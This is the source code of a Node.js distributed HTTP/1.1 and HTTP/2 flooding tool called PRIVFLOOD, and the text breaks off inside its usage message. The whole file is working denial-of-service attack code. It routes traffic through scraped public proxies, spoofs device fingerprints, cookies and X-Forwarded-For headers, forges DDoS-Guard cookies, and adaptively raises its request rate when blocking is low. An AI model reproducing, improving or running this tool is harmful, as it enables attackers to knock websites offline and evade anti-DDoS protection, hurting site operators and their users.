const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');
const { performance } = require('perf_hooks');

// Enhanced ignore lists
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning', 'FetchError', 'SocketError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123', 'ERR_TLS_CERT_ALTNAME_INVALID', 'ERR_SSL_WRONG_VERSION_NUMBER', 'HPE_INVALID_METHOD', 'HPE_INVALID_URL'];

// Device profiles
const deviceProfiles = [
    {
        name: 'iPhone 17 Pro Max',
        os: 'iOS',
        osVersion: '19.0',
        browser: 'Safari',
        browserVersion: '18.0',
        platform: 'iPhone',
        isMobile: true,
        screenWidth: 440,
        screenHeight: 956,
        dpr: 3,
        deviceMemory: 8,
        userAgentTemplate: 'Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="122", "Apple Safari";v="18"',
        secChUaMobile: '?1',
        secChUaPlatform: '"iOS"'
    },
    {
        name: 'Samsung Galaxy S26 Ultra',
        os: 'Android',
        osVersion: '16.0',
        browser: 'Chrome',
        browserVersion: '122.0.0.0',
        platform: 'Android',
        isMobile: true,
        screenWidth: 412,
        screenHeight: 915,
        dpr: 3.5,
        deviceMemory: 12,
        userAgentTemplate: 'Mozilla/5.0 (Linux; Android 16; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"',
        secChUaMobile: '?1',
        secChUaPlatform: '"Android"'
    },
    {
        name: 'Xiaomi Pad 7',
        os: 'Android',
        osVersion: '15.0',
        browser: 'Chrome',
        browserVersion: '121.0.0.0',
        platform: 'Android',
        isMobile: false,
        screenWidth: 800,
        screenHeight: 1280,
        dpr: 2,
        deviceMemory: 8,
        userAgentTemplate: 'Mozilla/5.0 (Linux; Android 15; Xiaomi Pad 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
        secChUaMobile: '?0',
        secChUaPlatform: '"Android"'
    },
    {
        name: 'MacBook Pro M5',
        os: 'macOS',
        osVersion: '15.0',
        browser: 'Safari',
        browserVersion: '18.0',
        platform: 'MacIntel',
        isMobile: false,
        screenWidth: 1512,
        screenHeight: 982,
        dpr: 2,
        deviceMemory: 16,
        userAgentTemplate: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="122", "Apple Safari";v="18"',
        secChUaMobile: '?0',
        secChUaPlatform: '"macOS"'
    },
    {
        name: 'Windows 11 Gaming Laptop (Lenovo Legion / ASUS TUF / ASUS ROG)',
        os: 'Windows',
        osVersion: '11',
        browser: 'Chrome',
        browserVersion: '122.0.0.0',
        platform: 'Win32',
        isMobile: false,
        screenWidth: 1920,
        screenHeight: 1080,
        dpr: 1,
        deviceMemory: 16,
        userAgentTemplate: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"',
        secChUaMobile: '?0',
        secChUaPlatform: '"Windows"'
    }
];

// Cookie lists, referrers, proxy list
const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang', 'consent', 'tracking', 'analytics', 'ab_test'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin', 'visitor', 'test', 'beta', 'prod', 'staging'];
const referrers = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://www.duckduckgo.com/',
    'https://www.reddit.com/', 'https://www.facebook.com/', 'https://www.twitter.com/', 'https://www.linkedin.com/',
    'https://www.youtube.com/', 'https://www.amazon.com/', 'https://www.ebay.com/', 'https://www.wikipedia.org/'
];

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
];

// Options parsing
const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    ddg: args.includes('-ddg'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s'),
    minRate: 1,
    maxRate: 10000,
    adaptive: true,
    currentJitter: args.includes('-j') ? parseFloat(args[args.indexOf('-j') + 1]) : 0.2,
    currentTimeout: args.includes('-t') ? parseInt(args[args.indexOf('-t') + 1]) : 10000,
    currentKeepalive: args.includes('-k') ? parseInt(args[args.indexOf('-k') + 1]) : 30000,
};

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    printUsage();
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);
const targetUrl = new URL(target);

// Load proxies
let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.length > 0);
} catch (e) {
    console.error(colors.red('✗ Error loading proxy file'));
    process.exit(1);
}

// Global stats
let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0,
    timeouts: 0,
    statusCodes: {}
};

// DDoS-Guard bypass cookies generator
function generateDdgCookies() {
    return `__ddg1=${Math.random().toString(36).substring(2, 10)}; __ddg2=${Math.random().toString(36).substring(2, 10)}; __ddg3=${Math.random().toString(36).substring(2, 10)}; __ddgid=${Math.random().toString(36).substring(2, 10)}; __ddgmark=${Math.random().toString(36).substring(2, 10)}`;
}

// Enhanced random cookie generator
function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] + Math.random().toString(36).substring(2, 10);
    const expires = new Date(Date.now() + 86400000).toUTCString();
    const path = Math.random() > 0.7 ? '; Path=/' : '';
    const domain = targetUrl ? (Math.random() > 0.7 ? `; Domain=.${targetUrl.hostname}` : '') : '';
    const secure = Math.random() > 0.5 ? '; Secure' : '';
    const httpOnly = Math.random() > 0.5 ? '; HttpOnly' : '';
    const sameSite = Math.random() > 0.7 ? '; SameSite=Lax' : '';
    return `${name}=${value}${path}${domain}${secure}${httpOnly}${sameSite}`;
}

// Select a random device profile
function getRandomDeviceProfile() {
    return deviceProfiles[Math.floor(Math.random() * deviceProfiles.length)];
}

// Generate User-Agent from profile
function generateUserAgent(profile) {
    return profile.userAgentTemplate;
}

// Build custom fingerprint headers for the device
function getFingerprintHeaders(profile) {
    return {
        'viewport-width': profile.screenWidth,
        'screen-width': profile.screenWidth,
        'screen-height': profile.screenHeight,
        'dpr': profile.dpr,
        'device-memory': profile.deviceMemory,
        'platform': profile.platform,
        'sec-ch-ua': profile.secChUa,
        'sec-ch-ua-mobile': profile.secChUaMobile,
        'sec-ch-ua-platform': profile.secChUaPlatform,
    };
}

// Build request for HTTP/1.1 (with fingerprint headers)
function buildRequest() {
    const method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'][Math.floor(Math.random() * 5)];
    const profile = getRandomDeviceProfile();
    const userAgent = generateUserAgent(profile);
    const referrer = referrers[Math.floor(Math.random() * referrers.length)];
    const fingerprint = getFingerprintHeaders(profile);

    let headers = `${method} ${targetUrl.pathname}${Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : ''} HTTP/1.1\r\n` +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${targetUrl.hostname}\r\n` +
        `Referer: ${referrer}\r\n`;

    // Cookies
    if (options.cookies || options.ddg) {
        let cookieStr = '';
        if (options.cookies) cookieStr += generateRandomCookie() + '; ';
        if (options.ddg) cookieStr += generateDdgCookies();
        if (cookieStr.endsWith('; ')) cookieStr = cookieStr.slice(0, -2);
        headers += `Cookie: ${cookieStr}\r\n`;
    }

    // Headfull / browser fingerprint headers
    if (options.headfull) {
        headers += `User-Agent: ${userAgent}\r\n`;
        headers += `sec-ch-ua: ${fingerprint['sec-ch-ua']}\r\n`;
        headers += `sec-ch-ua-mobile: ${fingerprint['sec-ch-ua-mobile']}\r\n`;
        headers += `sec-ch-ua-platform: ${fingerprint['sec-ch-ua-platform']}\r\n`;
        headers += `viewport-width: ${fingerprint['viewport-width']}\r\n`;
        headers += `screen-width: ${fingerprint['screen-width']}\r\n`;
        headers += `screen-height: ${fingerprint['screen-height']}\r\n`;
        headers += `dpr: ${fingerprint['dpr']}\r\n`;
        headers += `device-memory: ${fingerprint['device-memory']}\r\n`;
        headers += `platform: ${fingerprint['platform']}\r\n`;
        headers += 'Upgrade-Insecure-Requests: 1\r\n';
        if (Math.random() > 0.7) headers += 'DNT: 1\r\n';
    } else {
        headers += `User-Agent: ${userAgent}\r\n`;
    }

    // Random extra headers
    if (Math.random() > 0.5) headers += 'X-Requested-With: XMLHttpRequest\r\n';
    if (Math.random() > 0.7) {
        headers += 'X-Forwarded-For: ' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '\r\n';
    }
    headers += '\r\n';
    return Buffer.from(headers, 'binary');
}

// Frame encoding/decoding functions
function encodeFrame(streamId, type, payload = "", flags = 0) {
    try {
        let frame = Buffer.alloc(9);
        frame.writeUInt32BE(payload.length << 8 | type, 0);
        frame.writeUInt8(flags, 4);
        frame.writeUInt32BE(streamId, 5);
        if (payload.length > 0) frame = Buffer.concat([frame, payload]);
        return frame;
    } catch (e) { return Buffer.alloc(0); }
}
function decodeFrame(data) {
    try {
        if (!data || data.length < 9) return null;
        const lengthAndType = data.readUInt32BE(0);
        const length = lengthAndType >> 8;
        const type = lengthAndType & 0xFF;
        const flags = data.readUint8(4);
        const streamId = data.readUInt32BE(5);
        const offset = flags & 0x20 ? 5 : 0;
        let payload = Buffer.alloc(0);
        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length);
            if (payload.length + offset != length) return null;
        }
        return { streamId, length, type, flags, payload };
    } catch (e) { return null; }
}
function encodeSettings(settings) {
    try {
        const data = Buffer.alloc(6 * settings.length);
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6);
            data.writeUInt32BE(settings[i][1], i * 6 + 2);
        }
        return data;
    } catch (e) { return Buffer.alloc(0); }
}
function encodeRstStream(streamId, type, flags) {
    try {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    } catch (e) { return Buffer.alloc(0); }
}

// AI Controller (rate, jitter, timeout, keepalive)
let currentRate = rate;
let adaptiveTimer = setInterval(() => {
    const total = stats.requests || 1;
    const successRatio = stats.success / total;
    const errorRatio = stats.errors / total;
    const blockRatio = (stats.forbidden + stats.goaway) / total;
    const timeoutRatio = stats.timeouts / total;

    // Rate
    if (blockRatio > 0.3) currentRate = Math.max(options.minRate, Math.floor(currentRate * 0.6));
    else if (errorRatio > 0.4) currentRate = Math.max(options.minRate, Math.floor(currentRate * 0.8));
    else if (successRatio > 0.7 && blockRatio < 0.1) currentRate = Math.min(options.maxRate, Math.floor(currentRate * 1.5));
    else if (successRatio < 0.3 && blockRatio < 0.2) currentRate = Math.min(options.maxRate, Math.floor(currentRate * 1.2));
    currentRate = Math.max(options.minRate, Math.min(options.maxRate, currentRate));

    // Jitter
    if (blockRatio > 0.2) options.currentJitter = Math.min(0.8, options.currentJitter + 0.1);
    else if (successRatio > 0.5) options.currentJitter = Math.max(0.05, options.currentJitter - 0.05);

    // Timeout
    if (timeoutRatio > 0.2) options.currentTimeout = Math.min(30000, options.currentTimeout + 2000);
    else if (successRatio > 0.6) options.currentTimeout = Math.max(5000, options.currentTimeout - 1000);

    // Keepalive
    if (errorRatio > 0.3) options.currentKeepalive = Math.max(15000, options.currentKeepalive - 5000);
    else if (successRatio > 0.7) options.currentKeepalive = Math.min(60000, options.currentKeepalive + 5000);

    // Send to workers
    for (const id in cluster.workers) {
        cluster.workers[id].send({
            type: 'params',
            rate: currentRate,
            jitter: options.currentJitter,
            timeout: options.currentTimeout,
            keepalive: options.currentKeepalive
        });
    }

    if (options.debug) {
        console.log(colors.gray(`[AI] rate=${currentRate}/s, jitter=${options.currentJitter.toFixed(2)}, timeout=${options.currentTimeout}ms, keepalive=${options.currentKeepalive}ms`));
    }

    // Reset stats
    stats.success = 0; stats.errors = 0; stats.forbidden = 0; stats.goaway = 0; stats.timeouts = 0; stats.requests = 0;
}, 2000);

// Enhanced connection handler
function go() {
    const proxyEntry = proxies[~~(Math.random() * proxies.length)];
    if (!proxyEntry) return setTimeout(go, 100);
    const [proxyHost, proxyPort] = proxyEntry.split(':');
    if (!proxyPort || isNaN(proxyPort)) return setTimeout(go, 100);

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: targetUrl.hostname,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                timeout: options.currentTimeout
            });

            // Fix: attach error handler immediately to catch handshake errors
            tlsSocket.on('error', (err) => {
                stats.errors++;
                tlsSocket.destroy();
            });

            tlsSocket.on('close', () => {
                // Only schedule next go if not already destroyed
                if (!netSocket.destroyed) {
                    setTimeout(go, 100);
                }
            });

            tlsSocket.on('secureConnect', () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    // HTTP/1.1 pipelined (3 requests per write)
                    function doWrite() {
                        if (tlsSocket.destroyed) return;
                        const payloads = [];
                        for (let i = 0; i < 3; i++) payloads.push(buildRequest());
                        tlsSocket.write(Buffer.concat(payloads), (err) => {
                            if (!err) {
                                stats.requests += 3;
                                stats.success += 3;
                                const delay = (1000 / currentRate) * 3 * (1 + (Math.random() * options.currentJitter * 2 - options.currentJitter));
                                setTimeout(doWrite, delay);
                            } else {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }
                    doWrite();
                    return;
                }

                // HTTP/2 multiplexing (10 streams)
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);
                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);
                const frames = [
                    Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'),
                    encodeFrame(0, 4, encodeSettings([[1, 262144], [2, 0], [4, 6291456], [6, 65535]])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) tlsSocket.write(encodeFrame(0, 4, "", 1));
                            if (frame.type == 7 || frame.type == 5) {
                                stats.goaway++;
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                const streamsPerConn = 10;
                function doWrite() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    for (let i = 0; i < streamsPerConn; i++) {
                        const method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'][Math.floor(Math.random() * 5)];
                        const profile = getRandomDeviceProfile();
                        const userAgent = profile.userAgentTemplate;
                        const referrer = referrers[Math.floor(Math.random() * referrers.length)];
                        const fingerprint = getFingerprintHeaders(profile);
                        let headers = [
                            [':method', method],
                            [':authority', targetUrl.hostname],
                            [':scheme', 'https'],
                            [':path', targetUrl.pathname + (Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : '')],
                            ['user-agent', userAgent],
                            ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                            ['accept-encoding', 'gzip, deflate, br'],
                            ['accept-language', 'en-US,en;q=0.9'],
                            ['cache-control', options.cache ? 'max-age=0' : 'no-cache'],
                            ['referer', referrer]
                        ];
                        // Cookies
                        if (options.cookies || options.ddg) {
                            let cookieStr = '';
                            if (options.cookies) cookieStr += generateRandomCookie() + '; ';
                            if (options.ddg) cookieStr += generateDdgCookies();
                            if (cookieStr.endsWith('; ')) cookieStr = cookieStr.slice(0, -2);
                            headers.push(['cookie', cookieStr]);
                        }
                        // Fingerprint headers
                        if (options.headfull) {
                            headers.push(['sec-ch-ua', fingerprint['sec-ch-ua']]);
                            headers.push(['sec-ch-ua-mobile', fingerprint['sec-ch-ua-mobile']]);
                            headers.push(['sec-ch-ua-platform', fingerprint['sec-ch-ua-platform']]);
                            headers.push(['viewport-width', String(fingerprint['viewport-width'])]);
                            headers.push(['screen-width', String(fingerprint['screen-width'])]);
                            headers.push(['screen-height', String(fingerprint['screen-height'])]);
                            headers.push(['dpr', String(fingerprint['dpr'])]);
                            headers.push(['device-memory', String(fingerprint['device-memory'])]);
                            headers.push(['platform', fingerprint['platform']]);
                        }
                        // Extra random
                        if (Math.random() > 0.5) headers.push(['x-requested-with', 'XMLHttpRequest']);
                        if (Math.random() > 0.7) headers.push(['x-forwarded-for', Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)]);

                        const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(headers)]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            stats.requests += streamsPerConn;
                            stats.success += streamsPerConn;
                            const delay = (1000 / currentRate) * streamsPerConn * (1 + (Math.random() * options.currentJitter * 2 - options.currentJitter));
                            setTimeout(doWrite, delay);
                        } else {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }
                doWrite();
            });
        });
        netSocket.write(`CONNECT ${targetUrl.host}:443 HTTP/1.1\r\nHost: ${targetUrl.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        stats.errors++;
        netSocket.destroy();
        setTimeout(go, 100);
    });

    netSocket.setTimeout(options.currentKeepalive, () => {
        netSocket.destroy();
        setTimeout(go, 100);
    });
}

// Cluster master
if (cluster.isMaster) {
    console.clear();
    if (options.debug) {
        console.log(colors.brightRed(`
    ╔════════════════════════════════════════════════════════╗
    ║          ${colors.red('█▓▒░')} ${colors.brightRed('PRIVFLOOD')} ${colors.red('░▒▓█')}                    ║
    ║      ${colors.white('HTTP/1.1 & HTTP/2 Mixed RushAway')}            ║
    ╚════════════════════════════════════════════════════════╝
    
    ${colors.red('◆')} ${colors.white('Target:')} ${colors.brightRed(target)}
    ${colors.red('◆')} ${colors.white('Duration:')} ${colors.brightRed(duration + 's')}
    ${colors.red('◆')} ${colors.white('Threads:')} ${colors.brightRed(threads)}
    ${colors.red('◆')} ${colors.white('Rate:')} ${colors.brightRed(rate + '/s')}
    ${colors.red('◆')} ${colors.white('HTTP Version:')} ${colors.brightRed(options.version === '1' ? 'HTTP/1.1' : 'HTTP/2')}
    ${colors.red('◆')} ${colors.white('Cookies:')} ${colors.brightRed(options.cookies ? 'Enabled' : 'Disabled')}
    ${colors.red('◆')} ${colors.white('Headfull:')} ${colors.brightRed(options.headfull ? 'Enabled' : 'Disabled')}
    ${colors.red('◆')} ${colors.white('DDoS-Guard:')} ${colors.brightRed(options.ddg ? 'Enabled' : 'Disabled')}
    ${colors.red('◆')} ${colors.white('Cache:')} ${colors.brightRed(options.cache ? 'Enabled' : 'Disabled')}
    ${colors.red('◆')} ${colors.white('AI Adaptive:')} ${colors.brightRed('Enabled')}
    
    ${colors.dim('────────────────────────────────────────────────────')}
    ${colors.brightRed('⚡')} ${colors.white('Made with')} ${colors.red('❤')} ${colors.white('by')} ${colors.brightRed('PRIVFLOOD')} ${colors.white('(@privflood)')}
    ${colors.dim('────────────────────────────────────────────────────')}
`));
    }

    const workers = [];
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.requests += msg.requests || 0;
                stats.success += msg.success || 0;
                stats.errors += msg.errors || 0;
                stats.forbidden += msg.forbidden || 0;
                stats.goaway += msg.goaway || 0;
                stats.timeouts += msg.timeouts || 0;
                for (let code in msg.statusCodes) stats.statusCodes[code] = (stats.statusCodes[code] || 0) + msg.statusCodes[code];
            }
        });
    }

    setInterval(() => {
        if (options.debug) {
            const totalReq = stats.requests;
            const successRate = totalReq ? ((stats.success / totalReq) * 100).toFixed(1) : 0;
            const errorRate = totalReq ? ((stats.errors / totalReq) * 100).toFixed(1) : 0;
            const blockRate = totalReq ? ((stats.forbidden + stats.goaway) / totalReq * 100).toFixed(1) : 0;
            console.log(colors.gray(`[${new Date().toLocaleTimeString()}] Total: ${totalReq} | Success: ${stats.success} (${successRate}%) | Errors: ${stats.errors} (${errorRate}%) | Blocks: ${stats.forbidden + stats.goaway} (${blockRate}%) | Rate: ${currentRate}/worker`));
        }
    }, 5000);

    setTimeout(() => {
        if (options.debug) console.log(colors.red('\n⚡ Attack finished'));
        workers.forEach(worker => worker.kill());
        process.exit(0);
    }, duration * 1000);
} else {
    // Worker process
    let currentRate = rate;
    let currentJitter = options.currentJitter;
    let currentTimeout = options.currentTimeout;
    let currentKeepalive = options.currentKeepalive;

    process.on('message', (msg) => {
        if (msg.type === 'params') {
            currentRate = msg.rate;
            currentJitter = msg.jitter;
            currentTimeout = msg.timeout;
            currentKeepalive = msg.keepalive;
            options.currentJitter = currentJitter;
            options.currentTimeout = currentTimeout;
            options.currentKeepalive = currentKeepalive;
        }
    });

    function scheduleNext() {
        const interval = Math.max(1, Math.floor(1000 / currentRate));
        setTimeout(() => {
            go();
            scheduleNext();
        }, interval);
    }
    scheduleNext();

    setInterval(() => {
        process.send({
            type: 'stats',
            requests: stats.requests,
            success: stats.success,
            errors: stats.errors,
            forbidden: stats.forbidden,
            goaway: stats.goaway,
            timeouts: stats.timeouts,
            statusCodes: stats.statusCodes
        });
        stats.requests = 0; stats.success = 0; stats.errors = 0; stats.forbidden = 0; stats.goaway = 0; stats.timeouts = 0; stats.statusCodes = {};
    }, 1000);
}

// Proxy scraping function
async function scrapeProxies() {
    const file = "proxy.txt";
    const maxRetries = 3;
    try {
        if (fs.existsSync(file)) fs.unlinkSync(file);
        for (const proxy of proxyList) {
            let retries = 0;
            while (retries < maxRetries) {
                try {
                    const response = await httpx.get(proxy, { timeout: 10000, headers: { 'User-Agent': 'Mozilla/5.0' } });
                    fs.appendFileSync(file, response.data);
                    break;
                } catch (err) {
                    retries++;
                    if (retries === maxRetries && options.debug) console.log(colors.yellow(`Failed to fetch proxies from ${proxy}`));
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                }
            }
        }
        const proxyData = fs.readFileSync(file, 'utf-8');
        const uniqueProxies = [...new Set(proxyData.split('\n').filter(p => p.length > 0))];
        fs.writeFileSync(file, uniqueProxies.join('\n'));
        if (options.debug) console.log(colors.green(`Scraped ${uniqueProxies.length} unique proxies.`));
    } catch (err) {
        if (options.debug) console.log(colors.red('Error scraping proxies:'), err.message);
        process.exit(1);
    }
}

// Print usage
function printUsage() {
    console.log(colors.brightRed(`
    ╔════════════════════════════════════════════════════════╗
    ║          ${colors.red('█▓▒░')} ${colors.brightRed('PRIVFLOOD')} ${colors.red('░▒▓█')}                    ║
    ║      ${colors.white('HTTP/1.1 & HTTP/2 Mixed RushAway')}            ║
    ╚════════════════════════════════════════════════════════╝
    
    ${colors.white('Usage:')}
    ${colors.brightRed('node privflood.js <target> <duration> <proxies.txt> <threads> <rate> [options]')}
    ${colors.brightRed('node privflood.js scrape')} ${colors.white('(to scrape proxies)')}
    
    ${colors.white('Options:')}
    ${colors.red('◆')} ${colors.white('-c:')} ${colors.gray('Enable random cookies')}
    ${colors.red('◆')} ${colors.white('-h:')} ${colors.gray('Enable headfull requests')}
    ${colors.red('◆')} ${colors.white('-ddg:')} ${colors.gray('Enable DDoS-Guard bypass')}
    ${colors.red('◆')} ${colors.white('-v <1/2>:')} ${colors.gray('Choose HTTP version')}
    ${colors.red('◆')} ${colors.white('-ch:')} ${colors.gray('Enable/disable cache')}
    ${colors.red('◆')} ${colors.white('-s:')} ${colors.gray('Disable debug output')}
    ${colors.red('◆')} ${colors.white('-j <0-1>:')} ${colors.gray('Initial jitter factor')}
    ${colors.red('◆')} ${colors.white('-t <ms>:')} ${colors.gray('Initial timeout')}
